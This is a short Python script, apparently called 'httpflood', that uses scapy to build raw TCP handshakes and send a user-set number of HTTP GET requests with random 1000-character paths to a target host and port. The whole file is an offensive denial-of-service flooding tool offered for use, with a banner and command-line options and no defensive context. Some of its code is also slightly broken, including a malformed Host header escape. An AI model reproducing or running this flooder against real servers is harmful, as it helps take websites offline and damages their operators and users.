import sys,optparse,socket,random,string,threading,os
from urllib.request import urlopen
from scapy.all import *
count = 0
r,g,b,y,bo,end = '\033[31m','\033[32m','\033[32m','\033[93m','\033[01m','\033[0m'
def header():
    sys.stdout.write(y+"""
  _   _   _         __ _              _ 
 | |_| |_| |_ _ __ / _| |___  ___  __| |
 | ' \  _|  _| '_ \  _| / _ \/ _ \/ _` |
 |_||_\__|\__| .__/_| |_\___/\___/\__,_|
             |_|                        
             by ryland192000
    
[*] sending requests...
"""+end)

parser = optparse.OptionParser()
parser.add_option('-u', '--url',
    action = "store", dest = "url",
    help = "url", default = "")
parser.add_option('-p', '--port',
    action = "store", dest = "port",
    help = "destination port", default = "80")
parser.add_option('-r', '--requests',
    action
                  = "store", dest = "requests",
    help = "number of requests to send", default = "")
options,args = parser.parse_args()

try:
    ip = socket.gethostbyname(options.url)
except:
    print(r+bo+"Error: "+end+r+"invalid url")
    sys.exit(0)

def robots():
    def gen(size=1000, chars=string.ascii_uppercase + string.punctuation + string.ascii_lowercase + string.digits):
        return str(''.join(random.choice(chars) for _ in range(size))) 
    syn = IP(dst=options.url) / TCP(dport=int(options.port), flags='S')
    syn_ack = sr1(syn,verbose=0)
    payload = gen()
    getStr = 'GET /'+payload+' HTTP/1.1\r\n\Host: '+options.url+'\r\n\r\n'
    request = IP(dst=options.url) / TCP(dport=int(options.port), sport=syn_ack[TCP].dport,
            seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='A') / getStr
    reply = sr1(request, verbose=0)
header()
for x in range(int(options.requests)):
    count = count + 1
    robots()
print(y+"[*] "+str(count)+ " GET requests sent.")
count = 0
